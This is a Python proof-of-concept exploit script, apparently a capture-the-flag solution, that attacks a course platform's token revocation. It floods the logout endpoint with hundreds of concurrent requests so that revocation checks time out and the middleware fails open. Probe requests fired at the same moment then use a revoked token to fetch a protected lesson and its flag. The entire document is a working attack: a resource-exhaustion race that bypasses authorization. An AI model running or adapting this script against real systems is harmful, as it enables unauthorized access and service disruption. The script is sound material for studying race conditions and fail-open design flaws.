#!/usr/bin/env python3
"""
PoC v4: probe DURING flood, not after.

Strategy:
  - Spam /api/auth/logout with N OneTime tokens via threading.Barrier.
  - Among those threads, M probe requests target /lessons/access/<slug16> with
    revoked B.
  - At barrier release, all fire simultaneously. Mutex contention on revocation
    service spikes. Some Check calls timeout (50ms) → middleware fail-opens →
    if it's a probe, handler runs slug.Verify, returns lesson 16 + flag.
"""
from __future__ import annotations
import os, sys, time, secrets, string, threading
from concurrent.futures import ThreadPoolExecutor
from collections import Counter
import requests

BASE = os.environ.get("BASE", "http://127.0.0.1:8080").rstrip("/")
N_FLOOD = int(os.environ.get("N_FLOOD", "300"))
M_PROBE = int(os.environ.get("M_PROBE", "50"))


def rand_user():
    u = "u" + "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(11))
    p = "Pw" + secrets.token_urlsafe(12)
    return u, p


def main():
    s = requests.Session()
    print(f"[i] target: {BASE}, N_FLOOD={N_FLOOD}, M_PROBE={M_PROBE}")

    u, p = rand_user()
    s.post(f"{BASE}/api/auth/register", json={"username": u, "password": p}, timeout=10)
    user_tok = s.post(f"{BASE}/api/auth/login",
                      json={"username": u, "password": p}, timeout=10).json()["token"]

    B = s.post(f"{BASE}/api/courses/4/lessons/15/request-access",
               headers={"Authorization": f"Bearer {user_tok}"}, timeout=10).json()["token"]
    r = requests.get(f"{BASE}/api/courses/4",
                     headers={"Authorization": f"Bearer {B}"}, timeout=10)
    slug16 = next(l["slug"] for l in r.json()["lessons"] if l["id"] == 16 and l.get("slug"))
    print(f"[1] B + slug16 ready (B revoked)")

    print(f"[2] pre-issuing {N_FLOOD} OneTime tokens for flood...")
    flood_toks = []
    for _ in range(N_FLOOD):
        try:
            t = s.post(f"{BASE}/api/courses/4/lessons/15/request-access",
                       headers={"Authorization": f"Bearer {user_tok}"}, timeout=10).json()["token"]
            flood_toks.append(t)
        except Exception:
            break
    print(f"    {len(flood_toks)} tokens")

    barrier = threading.Barrier(len(flood_toks) + M_PROBE)
    probe_results = []
    probe_lock = threading.Lock()

    def flood(tok):
        barrier.wait()
        try:
            requests.post(f"{BASE}/api/auth/logout",
                          headers={"Authorization": f"Bearer {tok}"}, timeout=20)
        except Exception:
            pass

    def probe(_):
        barrier.wait()
        try:
            r = requests.get(f"{BASE}/api/courses/4/lessons/access/{slug16}",
                             headers={"Authorization": f"Bearer {B}"}, timeout=20)
            with probe_lock:
                probe_results.append((r.status_code, r.text))
        except Exception as e:
            with probe_lock:
                probe_results.append((-1, str(e)))

    print(f"[3] firing barrier...")
    t0 = time.time()
    with ThreadPoolExecutor(max_workers=len(flood_toks) + M_PROBE) as ex:
        for tok in flood_toks:
            ex.submit(flood, tok)
        for i in range(M_PROBE):
            ex.submit(probe, i)
    print(f"    race took {time.time()-t0:.2f}s")

    cnt = Counter(s_code for s_code, _ in probe_results)
    print(f"[4] probe statuses: {dict(cnt)}")
    for s_code, body in probe_results:
        if s_code == 200:
            print(f"\n[+] HIT! body:\n{body}")
            return 0
        if "alfa{" in body:
            print(f"\n[+] FLAG: {body}")
            return 0

    print("\n[-] no hits in race — try N_FLOOD/M_PROBE up")
    return 1


if __name__ == "__main__":
    sys.exit(main())
